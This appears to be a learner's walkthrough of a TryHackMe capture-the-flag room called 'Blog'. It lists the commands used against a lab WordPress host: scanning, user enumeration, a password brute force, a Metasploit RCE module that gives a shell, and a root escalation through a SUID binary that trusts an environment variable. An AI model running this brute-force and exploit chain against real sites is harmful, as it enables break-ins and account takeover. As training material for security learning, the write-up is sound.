TryHackMe Room: Blog

This repository documents my walkthrough and learnings from the **Blog** room on [TryHackMe](https://tryhackme.com/room/blog). It focuses on WordPress enumeration, brute-force login, remote code execution, and privilege escalation via SUID binary exploitation.

 Room Overview

- **Name**: Blog
-**Difficulty**: Medium
- **IP**:  10.10.139.126
- **Main Goals**:
  - Gain access to WordPress dashboard
  - Exploit RCE to get shell
  - Privilege escalate using custom SUID binary
  - Capture user.txt and root.txt flags

## 🧰 Tools Used

| Tool       | Purpose                       |
|------------|-------------------------------|
| nmap       | Port scanning                 |
| gobuster   | Directory enumeration         |
| wpscan     | WordPress scanning & bruteforce |
| metasploit  | Reverse shell                  |


## 🚩 Walkthrough Summary

### 1. Enumeration

```bash
nmap -sC -sV -T5  10.10.139.126 -oN nmap.txt


2 port are opens 22 ssh and 80 http

add /etc/hosts file

10.10.139.126 blog.thm


open blog.thm on broswer find the login page.

WordPress Exploitation
Use wpscan for user enumarions
wpscan –url http://blog.thm -e u

2 users found kwheel ,bjoel

password brute forcing 

wpscan –url http://blog.thm -U kwheel -P /usr/share/SecList/Passwords/Leaked-Databases/rockyou.txt

login the user and passwor

the wordpress versoin 5.0.0

Gaining Shell
Use metasploit
the start metasploit 
msfconsole
search wordpress 5.0.0
use exploit/multi/http/wp_crop_rce
www-data@blog:/var/www/wordpress$ 

Privilege Escalation
Found SUID binary: this command
find / -type f -user root -perm -u=s 2>/dev/null

/usr/sbin/checker

Analyze with strings or Ghidra → Looks for admin environment variable.

export admin=1
/usr/sbin/checker

Root shell access.
Key Learnings
      WordPress RCE via admin panel
      Password brute-force using wpscan
      Privilege escalation via SUID environment variable injection
      Importance of checking SUID and environment behavior

